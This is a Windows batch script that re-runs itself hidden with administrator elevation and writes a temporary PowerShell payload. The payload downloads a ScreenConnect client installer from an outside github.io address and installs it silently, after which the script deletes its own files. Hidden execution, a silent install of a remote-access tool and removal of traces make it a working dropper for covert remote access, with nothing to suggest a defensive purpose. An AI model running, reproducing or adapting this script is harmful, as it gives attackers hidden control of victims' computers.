@echo off
setlocal EnableDelayedExpansion

if "%~1" neq "hidden" (
    powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Start-Process -FilePath '%~f0' -ArgumentList 'hidden' -Verb RunAs"
    exit /b
)
set "WORK_DIR=%TEMP%"
set "PS_PAYLOAD=%WORK_DIR%\sc_task_%RANDOM%.ps1"
set "MSI_FILE=%WORK_DIR%\setup_%RANDOM%.msi"
set "LOG_FILE=%WORK_DIR%\install_log.txt"

(
echo $url = "https://draylong19281.github.io/ss/ScreenConnect.ClientSetupa.msi"
echo $path = "%MSI_FILE%"
echo try {
echo     $wc = New-Object System.Net.WebClient
echo     $wc.DownloadFile($url, $path^)
echo     $args = "/i `"$path`" /quiet /norestart /L*v %LOG_FILE%"
echo     $proc = Start-Process msiexec.exe -ArgumentList $args -Wait -PassThru
echo     exit $proc.ExitCode
echo } catch {
echo     exit 99
echo }
) > "%PS_PAYLOAD%"

powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File "%PS_PAYLOAD%"
set "EXIT_CODE=%ERRORLEVEL%"

del /f /q "%PS_PAYLOAD%" >nul 2>&1
del /f /q "%MSI_FILE%" >nul 2>&1

endlocal
exit /b %EXIT_CODE%
